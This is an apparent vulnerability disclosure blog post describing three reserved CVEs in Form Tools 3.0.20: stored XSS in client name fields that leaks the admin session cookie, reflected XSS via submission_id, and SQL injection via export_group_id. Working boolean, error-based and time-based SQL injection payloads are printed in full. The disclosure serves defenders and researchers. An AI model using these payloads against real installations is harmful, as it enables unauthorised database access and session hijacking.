<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>

  Bernardo  Rodrigues


  | Blog 

</title>
<meta name="description" content="Personal blog with research and articles.
">

<!-- Open Graph -->


<!-- Bootstrap & MDB -->
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet" integrity="sha512-MoRNloxbStBcD8z3M/2BmnT+rg4IsMxPkXaGh2zD6LGNNFE80W3onsAhRcMAMrSoyWL9xD7Ert0men7vR8LUZg==" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.1/css/mdb.min.css" integrity="sha512-RO38pBRxYH3SoOprtPTD86JFOclM51/XTIdEPh5j8sj4tp8jmQIx26twG52UaLi//hQldfrh7e51WzP9wuP32Q==" crossorigin="anonymous" />

<!-- Fonts & Icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css"  integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.0/css/academicons.min.css" integrity="sha512-W4yqoT1+8NLkinBLBZko+dFB2ZbHsYLDdr50VElllRcNt2Q4/GSs6u71UHKxB7S6JEMCp5Ve4xjh3eGQl/HRvg==" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons">

<!-- Code Syntax Highlighting -->
<link rel="stylesheet" href="https://gitcdn.link/repo/jwarby/jekyll-pygments-themes/master/github.css" />

<!-- Styles -->

<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>BR</text></svg>">

<link rel="stylesheet" href="/assets/css/main.css">
<link rel="canonical" href="/blog/2021/distill/">

<!-- JQuery -->
<!-- jQuery -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>


<!-- Theming-->

<script src="/assets/js/theme.js"></script>
<script src="/assets/js/dark_mode.js"></script>






    
<!-- MathJax -->
<script type="text/javascript">
  window.MathJax = {
    tex: {
      tags: 'ams'
    }
  };
</script>
<script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js"></script>
<script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>


    <script src="/assets/js/distillpub/template.v2.js"></script>
    <script src="/assets/js/distillpub/transforms.v2.js"></script>
    <script src="/assets/js/distillpub/overrides.js"></script>
    
    <style type="text/css">
      .fake-img {
  background: #bbb;
  border: 1px solid rgba(0, 0, 0, 0.1);
  box-shadow: 0 0px 4px rgba(0, 0, 0, 0.1);
  margin-bottom: 12px;
} .fake-img p {
  font-family: monospace;
  color: white;
  text-align: left;
  margin: 12px 0;
  text-align: center;
  font-size: 16px;
}

    </style>
    
  </head>

  <d-front-matter>
    <script async type="text/json">{
      "title": "Form Tools - CVEs",
      "description": "Vulnerabilities found in the software Form Tools",
      "published": "08, 2021",
      "authors": [
        
        {
          "author": "Bernardo Rodrigues",
          "authorURL": "https://www.linkedin.com/in/bernardofsrodrigues/",
          "country": [
            {
              "name": "Portugal",
              "url": ""
            }
          ]
        }
        
      ],
      "katex": {
        "delimiters": [
          {
            "left": "$",
            "right": "$",
            "display": false
          },
          {
            "left": "$$",
            "right": "$$",
            "display": true
          }
        ]
      }
    }</script>
  </d-front-matter>

  <body class="fixed-top-nav ">

    <!-- Header -->

    <header>

    <!-- Nav Bar -->
    <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top">
    <div class="container">
      
      <a class="navbar-brand title font-weight-lighter" href="/">
       <span class="font-weight-bold">Bernardo</span>   Rodrigues
      </a>
      
      <!-- Navbar Toggle -->
      <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar top-bar"></span>
        <span class="icon-bar middle-bar"></span>
        <span class="icon-bar bottom-bar"></span>
      </button>
      <div class="collapse navbar-collapse text-right" id="navbarNav">
        <ul class="navbar-nav ml-auto flex-nowrap">
          <!-- About -->
          <li class="nav-item ">
            <a class="nav-link" href="/">
              about
              
            </a>
          </li>
          
          <!-- Blog -->
          <li class="nav-item active">
            <a class="nav-link" href="/blog/">
              blog
              
            </a>
          </li>
          
          <!-- Other pages -->
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          <li class="nav-item ">
              <a class="nav-link" href="/projects/">
                projects
                
              </a>
          </li>
          
          
          
          <li class="nav-item ">
              <a class="nav-link" href="/publications/">
                publications
                
              </a>
          </li>
          

          
          
          
            <div class = "toggle-container">
              <a id = "light-toggle">
                  <i class="fas fa-sun"></i>
              </a>
            </div>
          
        </ul>
      </div>
    </div>
  </nav>

</header>


    <!-- Content -->

    <div class="post distill">

      <d-title>
        <h1>Form Tools 3.0.20 - Vulnerabilities</h1>
        <p>Vulnerabilities found in the software Form Tools</p>
      </d-title>

      <d-byline></d-byline>

      <d-article>
        <p><strong>NOTE:</strong>
          At this moment the CVEs are not yet public, however, they are reserved with the following codes: <b>CVE-2021-38143 - Stored XSS</b>, <b>CVE-2021-38144 - Reflected XSS</b> and <b>CVE-2021-38145 - SQL Injection</b>

<h2 id="CVE-2021-38143">CVE-2021-38143 - Stored XSS</h2>

<p>An issue was discovered in Form Tools through 3.0.20. When an administrator creates a customer account, it is possible for the customer to log in and proceed with a change of name and last name. However, these fields are vulnerable to XSS payload insertion, being triggered in the admin panel when the admin tries to see the client list. This type of XSS (Stored) can lead to the extraction of the PHPSESSID cookie belonging to the admin.

  Insertion of the payload in the "First Name" (client account) field:</p>
  
  <figure>
  <p><img src="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/StoredXSS.png?raw=true" alt="" style="width:100%"> </p>
  <figcaption><a href="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/StoredXSS.png?raw=true" target="_blank">Full quality image</a></figcaption>
  </figure>

  <br>

<p>The administrator logs in and opens the page with the list of clients:</p>
<figure>
  <p><img src="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/StoredXSS2.png?raw=true" alt="" style="width:100%"> </p>
  <figcaption><a href="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/StoredXSS2.png?raw=true" target="_blank">Full quality image</a></figcaption>
  </figure>
<p>XSS triggered and exposing the admin cookie.</p>

<hr />

<h2 id="CVE-2021-38144">CVE-2021-38144 - Reflected XSS</h2>

<p>An issue was discovered in Form Tools through 3.0.20. A low-privileged user can trigger Reflected XSS when viewing form via the submission_id parameter, e.g., <code class="language-plaintext highlighter-rouge">clients/forms/edit_submission.php?form_id=1&view_id=1&submission_id=[XSS]</code></p>

<figure>
  <p><img src="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/ReflectedXSS.png?raw=true" alt="" style="width:100%"> </p>
  <figcaption><a href="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/ReflectedXSS.png?raw=true" target="_blank">Full quality image</a></figcaption>
  </figure>

<hr />

<h2 id="CVE-2021-38145">CVE-2021-38145 - SQL Injection
</h2>

<p>An issue was discovered in Form Tools through 3.0.20. SQL Injection can occur via the <b>export_group_id</b> field when a low-privileged user (client) try to export a form with data, e.g., manipulation of <code class="language-plaintext highlighter-rouge">modules/export_manager/export.php?export_group_id=1&export_group_1_results=all&export_type_id=1</code></p>

<br>

<p>Create data table export using a normal user account by clicking <i>display:</i></p>
<figure>
  <p><img src="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/SQLI1.png?raw=true" alt="" style="width:100%"> </p>
  <figcaption><a href="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/SQLI1.png?raw=true" target="_blank">Full quality image</a></figcaption>
  </figure>

<br>

<p>Insertion of the special character <b>'</b> to test for possible break in the query and cause database errors:</p>
<figure>
  <p><img src="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/SQLI2.png?raw=true" alt="" style="width:100%"> </p>
  <figcaption><a href="https://github.com/bernardofsr/CVEs-With-PoC/raw/main/PoCs/Form%20Tools/images/SQLI2.png?raw=true" target="_blank">Full quality image</a></figcaption>
  </figure>


<p>The endpoint is vulnerable to the following types of SQL Injection attacks:</p>


<pre><code>&gt; Parameter: export_group_id (GET)
     
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
     Payload: export_group_id=1 AND 5636=5636&amp;export_group_1_results=all&amp;export_type_id=1

     Type: error-based
     Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
     Payload: export_group_id=1 AND (SELECT 4229 FROM(SELECT COUNT(*),CONCAT(0x717a627171,(SELECT (ELT(4229=4229,1))
     ),0x716b787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&amp;export_group_1_results=all&amp;
     export_type_id=1

     Type: time-based blind
     Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
     Payload: export_group_id=1 AND (SELECT 1946 FROM (SELECT(SLEEP(5)))nmeR)&amp;export_group_1_results=all&amp;
     export_type_id=1</code></pre>

</code>






</d-article>

      <d-appendix>
        <d-footnote-list></d-footnote-list>
        <d-citation-list></d-citation-list>
      </d-appendix>

    </div>

    <!-- Footer -->

    
<footer class="fixed-bottom">
  <div class="container mt-0">
    &copy; Copyright 2021 Bernardo  Rodrigues
  </div>
</footer>



  </body>

  <d-bibliography src="/assets/bibliography/2018-12-22-distill.bib">
  </d-bibliography>

</html>
